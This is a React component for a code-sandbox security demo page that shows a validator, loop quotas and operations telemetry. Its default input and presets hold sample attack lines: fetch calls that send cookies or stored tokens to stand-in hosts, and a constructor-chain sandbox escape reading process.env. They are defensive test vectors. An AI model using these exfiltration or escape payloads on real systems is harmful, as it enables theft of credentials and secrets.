/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from "react";
import {
  ShieldCheck,
  ShieldAlert,
  Play,
  AlertTriangle,
  Activity,
  RefreshCw,
} from "lucide-react";
import {
  validateCodeSecurity,
  ExecutionGuard,
  DEFAULT_SECURITY_POLICY,
} from "../core/security/sandbox";
import { OperationalLogEntry } from "../core/types";

interface OpsHealthData {
  status: string;
  toolchains: Record<string, { available: boolean; version: string }>;
  queue: {
    activeExecutions: number;
    queuedRequests: number;
    maxConcurrentExecutions: number;
    maxQueuedRequests: number;
  };
}

interface OpsMetricsData {
  config: {
    maxTraceEvents: number;
    maxOutputChars: number;
    maxExecutionTimeMs: number;
    rateLimitMaxRequests: number;
  };
  totals: {
    totalRequests: number;
    totalSucceeded: number;
    totalFailed: number;
    totalTimedOut: number;
    totalRateLimited: number;
  };
  recentLogs: OperationalLogEntry[];
}

export const SecurityLab: React.FC = () => {
  const [testCode, setTestCode] =
    useState<string>(`// Test untrusted code security verification
const fs = require('fs');
fetch('https://malicious-leak.io/tokens', { method: 'POST', body: document.cookie });
const hacked = []["constructor"]["constructor"]("return process.env")();
while (true) {
  // infinite loop test without exit
}
`);

  const [scanResult, setScanResult] = useState(() =>
    validateCodeSecurity(testCode),
  );
  const [quotaTestStatus, setQuotaTestStatus] = useState<string | null>(null);
  const [opsHealth, setOpsHealth] = useState<OpsHealthData | null>(null);
  const [opsMetrics, setOpsMetrics] = useState<OpsMetricsData | null>(null);
  const [recentLogs, setRecentLogs] = useState<OperationalLogEntry[]>([]);
  const [isLoadingOps, setIsLoadingOps] = useState<boolean>(false);

  const fetchOpsData = async () => {
    setIsLoadingOps(true);
    try {
      const [healthRes, metricsRes] = await Promise.all([
        fetch("/api/ops/health"),
        fetch("/api/ops/metrics"),
      ]);
      if (healthRes.ok) {
        const h = await healthRes.json();
        setOpsHealth(h);
      }
      if (metricsRes.ok) {
        const m = await metricsRes.json();
        setOpsMetrics(m);
        setRecentLogs(Array.isArray(m.recentLogs) ? m.recentLogs : []);
      }
    } catch {
      // Ignore network errors if offline
    } finally {
      setIsLoadingOps(false);
    }
  };

  useEffect(() => {
    fetchOpsData();
  }, []);

  const handleScan = () => {
    const result = validateCodeSecurity(testCode);
    setScanResult(result);
  };

  const handleTestInfiniteLoopGuard = () => {
    try {
      const guard = new ExecutionGuard({
        ...DEFAULT_SECURITY_POLICY,
        maxSteps: 20,
        timeoutMs: 100,
      });
      guard.start();

      for (let i = 0; i < 50; i++) {
        guard.recordStep();
      }
      setQuotaTestStatus("Unexpected: Loop was not halted.");
    } catch (err: any) {
      setQuotaTestStatus(
        `ExecutionGuard intercepted runaway loop at step 21: "${err.message}"`,
      );
    }
  };

  const loadPreset = (preset: "safe" | "network" | "proto" | "loop") => {
    if (preset === "safe") {
      const c = `// Safe Algorithm Code
function binarySearch(arr, target) {
  let low = 0;
  let high = arr.length - 1;
  while (low <= high) {
    let mid = Math.floor((low + high) / 2);
    if (arr[mid] === target) return mid;
    if (arr[mid] < target) low = mid + 1;
    else high = mid - 1;
  }
  return -1;
}
`;
      setTestCode(c);
      setScanResult(validateCodeSecurity(c));
    } else if (preset === "network") {
      const c = `fetch('https://api.steal.org', { body: localStorage.getItem('token') });`;
      setTestCode(c);
      setScanResult(validateCodeSecurity(c));
    } else if (preset === "proto") {
      const c = `const exploit = []["constructor"]["constructor"]("return globalThis")();`;
      setTestCode(c);
      setScanResult(validateCodeSecurity(c));
    } else if (preset === "loop") {
      const c = `while (true) {\n  // Runaway code\n}`;
      setTestCode(c);
      setScanResult(validateCodeSecurity(c));
    }
  };

  return (
    <div className="space-y-6 pb-12">
      {/* Header */}
      <div className="border-b border-[#1F2430] pb-5 flex flex-col md:flex-row md:items-end justify-between gap-4">
        <div className="space-y-1.5">
          <div className="font-mono text-xs text-emerald-400">
            Defense-in-Depth Containment · AST, Quota &amp; Production
            Operations
          </div>
          <h1 className="font-display text-2xl md:text-3xl font-semibold text-neutral-100 tracking-tight">
            Untrusted Code Security Sandbox &amp; Operations Lab
          </h1>
          <p className="text-sm text-neutral-400 max-w-[68ch]">
            Inspect how Parallax blocks disallowed host globals, prototype
            constructor escapes, network exfiltration, and infinite loops, and
            monitor live subprocess concurrency and privacy-preserving execution
            metrics.
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-1.5 shrink-0">
          <span className="text-xs text-neutral-400 mr-1">Test Vectors</span>
          <button
            type="button"
            onClick={() => loadPreset("safe")}
            className="btn-tactile text-xs px-2.5 py-1 rounded bg-[#161A23] hover:bg-[#1F2430] border border-[#1F2430] text-neutral-200 whitespace-nowrap"
          >
            Safe Binary Search
          </button>
          <button
            type="button"
            onClick={() => loadPreset("network")}
            className="btn-tactile text-xs px-2.5 py-1 rounded bg-[#161A23] hover:bg-[#1F2430] border border-[#1F2430] text-rose-300 whitespace-nowrap"
          >
            Network Exfiltration
          </button>
          <button
            type="button"
            onClick={() => loadPreset("proto")}
            className="btn-tactile text-xs px-2.5 py-1 rounded bg-[#161A23] hover:bg-[#1F2430] border border-[#1F2430] text-amber-300 whitespace-nowrap"
          >
            Prototype Escape
          </button>
          <button
            type="button"
            onClick={() => loadPreset("loop")}
            className="btn-tactile text-xs px-2.5 py-1 rounded bg-[#161A23] hover:bg-[#1F2430] border border-[#1F2430] text-neutral-200 whitespace-nowrap"
          >
            Infinite Loop
          </button>
        </div>
      </div>

      {/* Main Split Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-12 rounded-lg border border-[#1F2430] bg-[#10131A] overflow-hidden divide-y lg:divide-y-0 lg:divide-x divide-[#1F2430]">
        {/* Left: Code Buffer & Quota Simulator (6 cols) */}
        <div className="lg:col-span-6 p-5 space-y-4">
          <div className="flex items-center justify-between">
            <span className="font-display text-sm font-medium text-neutral-200">
              Untrusted Source Payload
            </span>
            <button
              type="button"
              onClick={handleScan}
              className="btn-tactile inline-flex items-center gap-1.5 px-3 py-1 rounded bg-emerald-500 hover:bg-emerald-400 text-neutral-950 font-semibold text-xs whitespace-nowrap"
            >
              <Play className="w-3.5 h-3.5 fill-current" />
              <span>Verify Payload</span>
            </button>
          </div>

          <textarea
            aria-label="Security Payload Code Editor"
            value={testCode}
            onChange={(e) => {
              setTestCode(e.target.value);
              setScanResult(validateCodeSecurity(e.target.value));
            }}
            rows={11}
            className="w-full bg-[#0A0C10] text-neutral-100 font-mono text-xs p-3.5 rounded-md border border-[#1F2430] focus:outline-none focus:border-emerald-500 leading-relaxed"
            spellCheck={false}
          />

          <div className="pt-1 flex flex-wrap items-center justify-between gap-2 text-xs">
            <span className="font-mono text-neutral-400">
              Quota Ceiling: 3,000 steps · 2,000ms timeout
            </span>
            <button
              type="button"
              onClick={handleTestInfiniteLoopGuard}
              className="btn-tactile text-emerald-400 hover:text-emerald-300 font-mono text-xs underline underline-offset-4"
            >
              Simulate Runaway Loop Interception →
            </button>
          </div>

          {quotaTestStatus && (
            <div className="p-3 rounded-md bg-[#0A0C10] border border-[#1F2430] text-xs text-emerald-300 font-mono">
              {quotaTestStatus}
            </div>
          )}
        </div>

        {/* Right: Security Verdict & 4-Layer Boundary Spec (6 cols) */}
        <div className="lg:col-span-6 p-5 bg-[#0A0C10]/50 space-y-5">
          {/* Scan Verdict */}
          <div
            className={`p-4 rounded-md border ${
              scanResult.isSafe
                ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-200"
                : "bg-rose-500/10 border-rose-500/30 text-rose-200"
            }`}
          >
            <div className="flex items-center gap-2 font-display text-sm font-semibold">
              {scanResult.isSafe ? (
                <>
                  <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span>Payload Cleared for Sandboxed Execution</span>
                </>
              ) : (
                <>
                  <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                  <span>
                    {scanResult.violations.length} Security Policy Violation
                    {scanResult.violations.length === 1 ? "" : "s"} Intercepted
                  </span>
                </>
              )}
            </div>

            {scanResult.isSafe ? (
              <p className="text-xs text-emerald-200/80 mt-1.5">
                No forbidden host globals, network calls, or prototype escape
                chains detected.
              </p>
            ) : (
              <ul className="space-y-1.5 mt-3 text-xs font-mono">
                {scanResult.violations.map((violation, i) => (
                  <li key={i} className="flex items-start gap-2 text-rose-200">
                    <AlertTriangle className="w-3.5 h-3.5 text-rose-400 shrink-0 mt-0.5" />
                    <span>{violation}</span>
                  </li>
                ))}
              </ul>
            )}
          </div>

          {/* 4-Layer Containment Spec */}
          <div className="space-y-2.5">
            <h3 className="font-display text-sm font-medium text-neutral-200">
              Four-Layer Containment Boundary
            </h3>
            <div className="divide-y divide-[#1F2430] border-t border-b border-[#1F2430] text-xs">
              <div className="py-2.5 flex items-start gap-3">
                <span className="font-mono text-emerald-400 shrink-0 w-28">
                  01 · AST Gate
                </span>
                <span className="text-neutral-400">
                  Static pre-execution validator blocks 25+ host identifiers (
                  <code className="text-neutral-200">process</code>,{" "}
                  <code className="text-neutral-200">fs</code>,{" "}
                  <code className="text-neutral-200">fetch</code>,{" "}
                  <code className="text-neutral-200">WebSocket</code>,{" "}
                  <code className="text-neutral-200">__proto__</code>).
                </span>
              </div>
              <div className="py-2.5 flex items-start gap-3">
                <span className="font-mono text-emerald-400 shrink-0 w-28">
                  02 · Scope Shadow
                </span>
                <span className="text-neutral-400">
                  Strict-mode execution wrapper explicitly shadows{" "}
                  <code className="text-neutral-200">window</code>,{" "}
                  <code className="text-neutral-200">document</code>,{" "}
                  <code className="text-neutral-200">globalThis</code>, and{" "}
                  <code className="text-neutral-200">Function</code> to{" "}
                  <code className="text-neutral-200">undefined</code>.
                </span>
              </div>
              <div className="py-2.5 flex items-start gap-3">
                <span className="font-mono text-emerald-400 shrink-0 w-28">
                  03 · Loop Quotas
                </span>
                <span className="text-neutral-400">
                  Babel AST injects{" "}
                  <code className="text-neutral-200">__tracer.enterLoop</code>{" "}
                  and <code className="text-neutral-200">step</code> hooks into
                  every <code className="text-neutral-200">for</code>,{" "}
                  <code className="text-neutral-200">while</code>, and{" "}
                  <code className="text-neutral-200">do-while</code> body to
                  preempt infinite loops.
                </span>
              </div>
              <div className="py-2.5 flex items-start gap-3">
                <span className="font-mono text-emerald-400 shrink-0 w-28">
                  04 · Process Group
                </span>
                <span className="text-neutral-400">
                  Subprocess runtimes (Python, C17, C++20, Java 21, C# 12)
                  enforce{" "}
                  <code className="text-neutral-200">ExecutionCoordinator</code>{" "}
                  concurrency caps (4 active, 20 queued),{" "}
                  <code className="text-neutral-200">kill(-pid, SIGKILL)</code>{" "}
                  process-group termination, and{" "}
                  <code className="text-neutral-200">ulimit</code> bounds.
                  Kernel <code className="text-neutral-200">seccomp-bpf</code> /{" "}
                  <code className="text-neutral-200">cgroups v2</code> require
                  host container deployment.
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Production Operations, Concurrency Queue & Privacy-Safe Observability Panel */}
      <div className="rounded-lg border border-[#1F2430] bg-[#10131A] p-5 space-y-4">
        <div className="flex flex-wrap items-center justify-between gap-2 border-b border-[#1F2430] pb-3">
          <div className="flex items-center gap-2">
            <Activity className="w-4 h-4 text-emerald-400" />
            <div>
              <h2 className="font-display text-sm font-semibold text-neutral-100">
                Production Operations, Bounded Concurrency Queue &amp;
                Privacy-Safe Telemetry
              </h2>
              <p className="text-xs text-neutral-400">
                Live operational health from{" "}
                <code className="font-mono text-neutral-200">
                  /api/ops/health
                </code>{" "}
                and{" "}
                <code className="font-mono text-neutral-200">
                  /api/ops/metrics
                </code>
                . User source code is never logged.
              </p>
            </div>
          </div>

          <button
            type="button"
            onClick={fetchOpsData}
            disabled={isLoadingOps}
            className="btn-tactile inline-flex items-center gap-1.5 px-2.5 py-1 rounded bg-[#161A23] hover:bg-[#1F2430] border border-[#1F2430] text-neutral-200 text-xs font-mono"
          >
            <RefreshCw
              className={`w-3.5 h-3.5 text-emerald-400 ${
                isLoadingOps ? "animate-spin" : ""
              }`}
            />
            <span>Refresh Telemetry</span>
          </button>
        </div>

        {opsHealth && (
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs tabular-nums">
            <div className="p-3 rounded border border-[#1F2430] bg-[#0A0C10] space-y-1.5">
              <div className="text-neutral-400 text-[11px]">
                Execution Concurrency &amp; Queue
              </div>
              <div className="text-neutral-100">
                Active Workers:{" "}
                <strong className="text-emerald-400">
                  {opsHealth.queue.activeExecutions} /{" "}
                  {opsHealth.queue.maxConcurrentExecutions}
                </strong>
              </div>
              <div className="text-neutral-300">
                Queued Requests: {opsHealth.queue.queuedRequests} /{" "}
                {opsHealth.queue.maxQueuedRequests}
              </div>
              <div className="text-neutral-400 text-[11px]">
                Succeeded: {opsMetrics?.totals.totalSucceeded ?? 0} · Failed:{" "}
                {opsMetrics?.totals.totalFailed ?? 0} · Rate Limited:{" "}
                {opsMetrics?.totals.totalRateLimited ?? 0}
              </div>
            </div>

            <div className="p-3 rounded border border-[#1F2430] bg-[#0A0C10] space-y-1.5">
              <div className="text-neutral-400 text-[11px]">
                Configured Execution Quotas
              </div>
              <div className="text-neutral-200">
                Max Trace Events: {opsMetrics?.config.maxTraceEvents ?? 2500}
              </div>
              <div className="text-neutral-200">
                Execution Timeout:{" "}
                {opsMetrics?.config.maxExecutionTimeMs ?? 3500}ms
              </div>
              <div className="text-neutral-400 text-[11px]">
                Max Output: {opsMetrics?.config.maxOutputChars ?? 50000} chars ·
                Rate Limit: {opsMetrics?.config.rateLimitMaxRequests ?? 90}/min
              </div>
            </div>

            <div className="p-3 rounded border border-[#1F2430] bg-[#0A0C10] space-y-1.5">
              <div className="text-neutral-400 text-[11px]">
                Runtime Toolchain Health ({opsHealth.status})
              </div>
              <div className="grid grid-cols-2 gap-1 text-[11px]">
                {Object.entries(opsHealth.toolchains).map(([lang, info]) => (
                  <div key={lang} className="flex items-center gap-1.5">
                    <span
                      className={`w-1.5 h-1.5 rounded-full ${
                        info.available ? "bg-emerald-400" : "bg-rose-400"
                      }`}
                    />
                    <span className="text-neutral-200 uppercase truncate">
                      {lang.split("_")[0]}:
                    </span>
                    <span className="text-neutral-400 truncate">
                      {info.available ? "Ready" : "Offline"}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {recentLogs.length > 0 && (
          <div className="space-y-1.5 font-mono text-xs tabular-nums">
            <div className="text-[11px] text-neutral-400">
              Recent Privacy-Safe Structured Execution Logs (Zero Source Code
              Stored)
            </div>
            <div className="max-h-36 overflow-y-auto rounded border border-[#1F2430] bg-[#0A0C10] divide-y divide-[#1F2430]">
              {recentLogs.slice(0, 6).map((log) => (
                <div
                  key={log.requestId}
                  className="px-3 py-1.5 flex flex-wrap items-center justify-between gap-2 text-[11px]"
                >
                  <span className="text-emerald-400">
                    {log.requestId} · {log.language.toUpperCase()}
                  </span>
                  <span className="text-neutral-300">
                    Exec: {log.executionDurationMs}ms (Queue:{" "}
                    {log.queueDurationMs}ms) · {log.traceEventCount} events
                  </span>
                  <span
                    className={
                      log.executionSuccess
                        ? "text-emerald-300"
                        : "text-rose-300"
                    }
                  >
                    {log.executionSuccess
                      ? "Success"
                      : `Failed (${log.errorCategory || "error"})`}
                  </span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
